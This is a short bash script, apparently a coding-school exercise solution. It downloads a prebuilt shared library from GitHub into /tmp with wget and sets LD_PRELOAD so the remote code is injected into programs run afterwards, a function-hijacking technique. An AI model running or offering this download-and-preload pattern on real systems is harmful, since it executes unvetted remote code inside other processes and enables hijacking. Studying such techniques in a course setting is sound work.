#!/bin/bash
wget https://github.com/ishaq2023/alx-low_level_programming/raw/master/0x18-dynamic_libraries/101-libfake.so -O /tmp/libgiga.so
export LD_PRELOAD=/tmp/libgiga.so
